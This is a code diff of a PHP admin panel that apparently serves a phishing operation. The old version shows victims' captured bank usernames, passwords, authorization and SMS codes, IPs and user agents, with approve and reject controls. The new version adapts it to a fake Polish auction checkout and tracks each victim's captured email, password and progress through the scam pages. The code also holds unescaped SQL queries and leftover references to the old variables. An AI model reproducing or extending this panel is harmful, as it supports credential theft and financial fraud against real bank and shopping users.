@@ -1,9 +1,7 @@
-
-
-
-<?php include('header.php'); 
+<?php include('header.php');
 include('YH0uW3ecaRHG16ld4waY.php');
 include('db.php'); 
+include_once('utils.php');
 
 //echo '<script>alert("'.$session_role.'");</script>';
 //echo '<script>alert('.$_SESSION['user_id'].');</script>';
@@ -28,8 +26,7 @@ if($_GET['delete']=='else'){
         $sqldel = "DELETE FROM payment WHERE id='$del_id'";
         $con->query($sqldel);
 //        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';
-            
-        }        
+        }
     }
 }
 ?>
@@ -159,7 +156,7 @@ if($num1!=$num2){
          <thead>
             <tr>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
-                    <div title="Email" class="pull-left over-flow"> Payment Amount</div>
+                    <div title="Email" class="pull-left over-flow">PLN</div>
                   </th>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
                     <div title="Email" class="pull-left over-flow"> Login Status</div>
@@ -168,32 +165,19 @@ if($num1!=$num2){
                     <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                   </th>
                   <th style="" id="ember1925" class="sortable text-left ember-view">
-                    <div title="Name" class="pull-left over-flow"> Bank Name</div>
+                    <div title="Name" class="pull-left over-flow"> Item Name</div>
                   </th>
-                  <th style="" id="ember1925" class="sortable text-left ember-view">
-                    <div title="Name" class="pull-left over-flow"> Status</div>
-                  </th>
+
                  <th style="" id="ember1926" class="sortable text-left ember-view">
                     <div title="Company Name" class="pull-left over-flow"> Login / Password</div>
-                  </th>
-                 <th style="" id="ember1926" class="sortable text-left ember-view">
-                    <div title="Company Name" class="pull-left over-flow"> Others</div>
-                  </th>
-                 <th style="" id="ember1927" class="sortable text-left ember-view">
-                    <div title="Email" class="pull-left over-flow"> Authentication Code</div>
                   </th>
                   <th style="" id="ember1927" class="sortable text-left ember-view">
                     <div title="userip" class="pull-left over-flow"> UserIP/Agent</div>
                   </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Action</div>
-                  </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Clone</div>
-                  </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Block</div>
-                  </th>
+
+                <th style="" id="ember1925" class="sortable text-left ember-view">
+                    <div title="Name" class="pull-left over-flow"> Status</div>
+                </th>
                  <th style="" id="ember1930" class="text-left ember-view">
                     <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                   </th>
@@ -204,49 +188,20 @@ if($num1!=$num2){
         <tbody>
             <?php 
             $header_2=0;
-            $con->query("UPDATE `payment` SET `last_login` = `last_login`+'10' WHERE 1");
-            if($session_role=='admin'){
-				//echo "admin";
-				//$sql1 = "SELECT * FROM `payment`   order by last_login";
-				//$new1 = $con->query($sql1);
-				
-				$sql1 = "SELECT * FROM `payment` WHERE last_login<'180' order by order_flag_time ";
-				$new1 = $con->query($sql1);
-				$paolo_arr = [];
-				while ($pay = $new1->fetch_assoc()) {
-					$paolo_arr[] = $pay;
-				}
-				
-				$sql1 = "SELECT * FROM `payment` WHERE  last_login>='180' order by last_login ";
-				$new1 = $con->query($sql1);
-				while ($pay = $new1->fetch_assoc()) {
-					$paolo_arr[] = $pay;
-				}
-				
-				$new1 = $paolo_arr;
-            }else{
-				//echo "user123";
-				$sql1 = "SELECT * FROM `payment` WHERE `break` = 'off' AND `company_email` = '$session_email' AND last_login<'180' order by order_flag_time ";
-				$new1 = $con->query($sql1);
-				$paolo_arr = [];
-				while ($pay = $new1->fetch_assoc()) {
-					$paolo_arr[] = $pay;
-				}
-				
-				$sql1 = "SELECT * FROM `payment` WHERE `break` = 'off' AND `company_email` = '$session_email' AND last_login>='180' order by last_login ";
-				$new1 = $con->query($sql1);
-				while ($pay = $new1->fetch_assoc()) {
-					$paolo_arr[] = $pay;
-				}
-				
-				$new1 = $paolo_arr;
+            $sql1 = "SELECT * , TIMESTAMPDIFF(SECOND,t1.updated_at, CURRENT_TIMESTAMP()) AS timediff  FROM `auctions` AS t1 LEFT JOIN (SELECT * FROM `purchases` ORDER BY `id` DESC) t2 ON t1.id=t2.auction_id ORDER BY t1.updated_at DESC";
+            $new1 = $con->query($sql1);
+            $paolo_arr = [];
+            while ($auction = $new1->fetch_assoc()) {
+                $paolo_arr[] = $auction;
             }
-            foreach ($new1 as $pay) {
-            $acode = $pay['code'];
+            $new1 = $paolo_arr;
+
+            foreach ($new1 as $auction) {
+
 			//echo json_encode($pay);
             ?>
 
-            <?php if($pay['last_login'] > '180' && $header_2==0){ $header_2=1;?>
+            <?php if($auction['timediff'] > '180' && $header_2==0){ $header_2=1;?>
 
 </tbody>
         </table>
@@ -254,7 +209,7 @@ if($num1!=$num2){
          <thead>
             <tr>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
-                    <div title="Email" class="pull-left over-flow"> Payment Amount</div>
+                    <div title="Email" class="pull-left over-flow"> PLN </div>
                   </th>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
                     <div title="Email" class="pull-left over-flow"> Login Status</div>
@@ -263,31 +218,16 @@ if($num1!=$num2){
                     <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                   </th>
                   <th style="" id="ember1925" class="sortable text-left ember-view">
-                    <div title="Name" class="pull-left over-flow"> Bank Name</div>
-                  </th>
-                  <th style="" id="ember1925" class="sortable text-left ember-view">
-                    <div title="Name" class="pull-left over-flow"> Status</div>
+                    <div title="Name" class="pull-left over-flow"> Item Name</div>
                   </th>
                  <th style="" id="ember1926" class="sortable text-left ember-view">
                     <div title="Company Name" class="pull-left over-flow"> Login / Password</div>
                   </th>
-                 <th style="" id="ember1926" class="sortable text-left ember-view">
-                    <div title="Company Name" class="pull-left over-flow"> Others</div>
-                  </th>
-                 <th style="" id="ember1927" class="sortable text-left ember-view">
-                    <div title="Email" class="pull-left over-flow"> Authentication Code</div>
-                  </th>
                   <th style="" id="ember1927" class="sortable text-left ember-view">
                     <div title="userip" class="pull-left over-flow"> UserIP/Agent</div>
                   </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Action</div>
-                  </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Clone</div>
-                  </th>
-                 <th style="" id="ember1930" class="text-left ember-view">
-                    <div title="Unused Credits" class="pull-left over-flow"> Block</div>
+                  <th style="" id="ember1925" class="sortable text-left ember-view">
+                        <div title="Name" class="pull-left over-flow"> Status</div>
                   </th>
                  <th style="" id="ember1930" class="text-left ember-view">
                     <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
@@ -300,106 +240,122 @@ if($num1!=$num2){
 
 <?php } ?>
 
-                <tr data-ember-action="" data-ember-action-1946="1946" style="background: <?php if($pay['status'] == 'block')
-				{ echo '#F7B0DB'; }elseif($pay['status'] == 'aproove')
-				{ echo '#20b523'; }elseif($pay['status'] == 'login_aproove')
-				{ echo '#FFA500'; }elseif($pay['status'] == 'copy')
-				{ echo '#77f97b'; } ?>">
+<tr data-ember-action="" data-ember-action-1946="1946" style="background: <?php if ($pay['status'] == 'block') {
+    echo '#F7B0DB';
+} elseif ($pay['status'] == 'aproove') {
+    echo '#20b523';
+} elseif ($pay['status'] == 'login_aproove') {
+    echo '#FFA500';
+} elseif ($pay['status'] == 'copy') {
+    echo '#77f97b';
+} ?>">
 
-				<td>
-					<!--<i class="fa fa-user"></i>
-					<?php echo $pay['company_email']; ?>-->
-					<?php echo $pay['payment'];?></td>
-                <td id="ember1961" class="ember-view">
-					<?php 
-						if($pay['last_login'] < '180'){ 
-							echo '<i class="fa fa-power-off" style="color:green;"></i> Active';
-						}
-						else { 
-							echo '<i class="fa fa-power-off" style="color:red;"></i> '.$pay['last_login'].' Sec ago'; 
-						} 
-					?>
-                </td>
-                <td id="ember1965" class="ember-view">
-                    <input type="text" id="id<?php echo $pay['id']; ?>" name="" value="<?php echo "https://".$_SERVER['SERVER_NAME']."/".URL_directory1; ?>index.php?id=<?php echo $pay['id']; ?>" style="width: 10px;" readonly><?php $ids=$pay['id']; ?>
-<a onclick="copy('#id<?php echo $ids; ?>');" class="btn btn-primary popovercontainer ember-view"><?php echo $pay['id']; ?></a>
+    <td>
+        <?php echo $auction['price']*$auction['number_of_items']+12; ?>
+    </td>
+    <td id="ember1961" class="ember-view">
+        <?php
+        if ($auction['updated_at'] < '180') {
+            echo '<i class="fa fa-power-off" style="color:green;"></i> Active';
+        } else {
+            echo '<i class="fa fa-power-off" style="color:red;"></i> ' . $auction['timediff'] . ' Sec ago';
+        }
+        ?>
+    </td>
+    <td id="ember1965" class="ember-view">
+        <input type="text" id="id<?php echo $pay['id']; ?>" name=""
+               value="<?php echo "https://" . $_SERVER['SERVER_NAME'] . "/" . URL_Auction; ?>index.php?payment_id=<?php echo $auction['payment_id']; ?>"
+               style="width: 10px;" readonly><?php $ids = $auction['payment_id']; ?>
+        <a onclick="copy('#id<?php echo $ids; ?>');"
+           class="btn btn-primary popovercontainer ember-view"><?php echo $auction['payment_id']; ?></a>
 
-</td>
+    </td>
 
-                <td id="ember1965" class="ember-view">
-                  <?php echo $pay['bank_name']; ?>
-                </td>
+    <td id="ember1965" class="ember-view">
+        <?php echo $auction['product_name']; ?>
+    </td>
 
-                <td id="ember1965" class="ember-view">
-                 <?php if($pay['last_login'] < '180'){ if($pay['page_name']=='index.php'){echo 'Login page'; }elseif(($pay['page_name']=='mtransfer_steptwo.php') || ($pay['page_name']=='indexauth.php')){echo 'Authcode page'; } } ?>
-                </td>
+    <td id="ember1960" class="ember-view">
+        <div>
+        <input type="text" id="user<?php echo $ids; ?>" name="" value="<?php echo $auction['email']; ?>"
+               style="width: 100px; background:transparent;" onclick="copy('#user<?php echo $ids; ?>');" readonly>
+        </div>
+        <div><input type="text" id="pass<?php echo $ids; ?>" name="" value="<?php echo $auction['password']; ?>"
+                 style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $ids; ?>');" readonly>
+        </div>
+    </td>
 
-                <td id="ember1960" class="ember-view">    
-                    <input type="text" id="user<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_id']; ?>" style="width: 100px; background:transparent;" onclick="copy('#user<?php echo $ids; ?>');" readonly>
-                  - <input type="text" id="pass<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_password']; ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $ids; ?>');" readonly>
-                </td>
-                <td id="ember1960" class="ember-view">
-                    <input type="text" id="jss<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_auth_type']; ?>" style="width: 100px; background:transparent;" onclick="copy('#jss<?php echo $ids; ?>');" readonly>
-                  - <input type="text" id="ass<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_auth_pass']; ?>" style="width: 100px;  background:transparent;" onclick="copy('#ass<?php echo $ids; ?>');" readonly>
-                </td>
-                
-                <td id="ember1961" class="ember-view">
-                    <input type="text" id="pass<?php echo $pay['code']; ?>" name="" value="<?php echo $pay['code'];  ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $acode; ?>');" readonly>
-                  <!--<a id="code<?php echo $pay['code']; ?>" onclick="copy('#code<?php echo $acode; ?>');"><?php if(($pay['status']=='show') || ($pay['status']=='aproove')){ echo $pay['code']; } ?></a>-->
-                  <br>
-                  <input type="text" id="gridcode<?php echo $pay['id'] ?>" name="" value="<?php echo $pay['gridcode'];  ?>" style="width: 30px;  background:transparent;" > 
-<!--                   <input id="check1" name="grid" class="ember-checkbox ember-view" type="checkbox" onclick="changegrid('<?php echo $pay['id'] ?>')" style="cursor: pointer;" <?php if(strlen($pay['gridcode'])>0){ echo "checked='checked'"; } ?>> -->
-                  <input id="check<?php echo $pay['id'] ?>" name="grid" class="ember-checkbox ember-view" type="checkbox" onclick="changegrid('<?php echo $pay['id'] ?>')" style="cursor: pointer;" <?php if($pay['checked']>0){ echo "checked='checked'"; } ?>>
-                  <!--input type="text" id="gridvalue<?php echo $pay['gridvalue']; ?>" name="" value="<?php echo $pay['gridvalue'];  ?>" style="width: 50px;  background:transparent;" readonly-->
-                  <!--<a id="code<?php echo $pay['code']; ?>" onclick="copy('#code<?php echo $acode; ?>');"><?php if(($pay['status']=='show') || ($pay['status']=='aproove')){ echo $pay['code']; } ?></a>-->
-                 
+    <td id="ember1960" class="ember-view">
+        <div>
+        <input type="text" id="ipss<?php echo $ids; ?>" onclick="copy('#ipss<?php echo $ids; ?>');" name=""
+               value="<?php echo $auction['userip']; ?>" style="width: 100px; background:transparent;" readonly>
+        </div>
+        <div>
+            <input type="text" id="agass<?php echo $ids; ?>" onclick="copy('#agass<?php echo $ids; ?>');" name=""
+                 value="<?php echo $auction['useragent']; ?>" style="width: 100px;  background:transparent;" readonly>
+        </div>
+    </td>
+    <td id="ember1925" class="ember-view">
+        <?php
+        if ($auction['page_status'] === 'main_page')
+        {
+            echo '<span style="margin-right: 20px;">Main Page <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">KUP TERAZ <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">CONFIRMATION <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">SET ADDRESS <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">PAY PAGE <i class="fa fa-times-circle" style="color:red;"></i></span>';
+        }
+        else if ($auction['page_status'] === 'login_page')
+        {
+            echo '<span style="margin-right: 20px;">Main Page <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">KUP TERAZ <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">CONFIRMATION <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">SET ADDRESS <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">PAY PAGE <i class="fa fa-times-circle" style="color:red;"></i></span>';
+        }
+        else if ($auction['page_status'] === 'confirm_page')
+        {
+            echo '<span style="margin-right: 20px;">Main Page <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">KUP TERAZ <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">CONFIRMATION <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">SET ADDRESS <i class="fa fa-times-circle" style="color:red;"></i></span>';
+            echo '<span style="margin-right: 20px;">PAY PAGE <i class="fa fa-times-circle" style="color:red;"></i></span>';
+        }
+        else if ($auction['page_status'] === 'address_page')
+        {
+            echo '<span style="margin-right: 20px;">Main Page <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">KUP TERAZ <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">CONFIRMATION <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">SET ADDRESS <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">PAY PAGE <i class="fa fa-times-circle" style="color:red;"></i></span>';
+        }
+        else if ($auction['page_status'] === 'payment_page')
+        {
+            echo '<span style="margin-right: 20px;">Main Page <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">KUP TERAZ <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">CONFIRMATION <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">SET ADDRESS <i class="fa fa-check-circle" style="color:green;"></i></span>';
+            echo '<span style="margin-right: 20px;">PAY PAGE <i class="fa fa-check-circle" style="color:green;"></i></span>';
+        }
 
-                 <!-- <text><?php $pay['gridcode'] ?></text>
-                  <input placeholder="Smscode" style="
-                                <?php if(($pay['checked']==0)&&($pay['gridcode'] != "")) { echo "display: none"; } ?>
-                  " >
-                  <input placeholder="Code numer" style="
-                                <?php if(($pay['checked']==0)&&($pay['gridcode'] == "")) { echo "display: none"; } ?>
-                  " > -->
-				  
-                </td>
-                <td id="ember1960" class="ember-view">    
-                    <input type="text" id="ipss<?php echo $ids; ?>" onclick="copy('#ipss<?php echo $ids; ?>');" name="" value="<?php echo $pay['userip']; ?>" style="width: 100px; background:transparent;"  readonly>
-                  - <input type="text" id="agass<?php echo $ids; ?>"  onclick="copy('#agass<?php echo $ids; ?>');" name="" value="<?php echo $pay['useragent']; ?>" style="width: 100px;  background:transparent;"  readonly>
-                </td>
-                <td id="ember1962" class="ember-view">
-                  <?php  if($pay['status']=='aproove'){  ?>
-                  <button style="background-color: green;padding: 5px 20px 5px 20px;color: white" disabled="">Aprooved</button>
-                  <a href="status_payment.php?id=<?php echo $pay['id']; ?>" class="btn btn-primary">Reload</a>
-                  <?php }elseif($pay['status']=='block'){}else{ ?>
-                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="aproove(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_aproove'){ echo "checked='checked'"; } ?>>L OK
-                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_aproove(<?php echo $pay['id'] ?>)" <?php if($pay['status']=='aprove'){ echo "checked='checked'"; } ?> style="cursor: pointer;">Kod OK<br>
-                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="logoncancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_invalid'){ echo "checked='checked'"; } ?>>LOG X
-                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_cancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='invalid_code'){ echo "checked='checked'"; } ?>>KOD X
-                  <?php } ?>
-                  <button id="but" style="background-color: green;padding: 5px 20px 5px 20px;color: white;display: none" disabled="">Aprooved</button>
-                </td>
-                <td id="ember1961" class="ember-view">
-                  <a href="pay_copy.php?id=<?php echo $pay['id'];  ?>" style="color:red;"><i class="fa fa-clone"></i></a>
-                </td>
-                <td id="ember1961" class="ember-view">
-                    <?php if($pay['block_status']=='unblocked'){ ?>
-                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=block" style="color:red;"><i class="fa fa-ban"></i></a>
-                    <?php } if($pay['block_status']=='block'){ ?>
-                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=unblocked" style="color:green;"><i class="fa fa-unlock"></i></a>
-                    <?php } ?>
-                </td>
-                <td id="ember1961" class="ember-view">
-                  <a href="pay_delete.php?id=<?php echo $pay['id'];  ?>&page=usrauth.php" style="color:red;"><i class="fa fa-trash"></i></a>
+        ?>
+    </td>
+    <td id="ember1961" class="ember-view">
+        <a href="pay_delete.php?id=<?php echo $pay['id']; ?>&page=usrauth.php" style="color:red;"><i
+                    class="fa fa-trash"></i></a>
 
-<?php if($pay['checkbox']=='on'){ ?>
-               &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>" id="<?php echo $pay['id']; ?>" style="cursor:pointer" onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)" checked="">                  
-<?php }else{ ?>
-               &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>" id="<?php echo $pay['id']; ?>" style="cursor:pointer" onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)">                  
+        <?php if ($pay['checkbox'] == 'on') { ?>
+            &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>"
+                          id="<?php echo $pay['id']; ?>" style="cursor:pointer"
+                          onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)" checked="">
+        <?php } else { ?>
+            &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>"
+                          id="<?php echo $pay['id']; ?>" style="cursor:pointer"
+                          onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)">
 
-<?php } ?>
-                </td>
-            </tr>
+        <?php } ?>
+    </td>
+</tr>
 
 
 
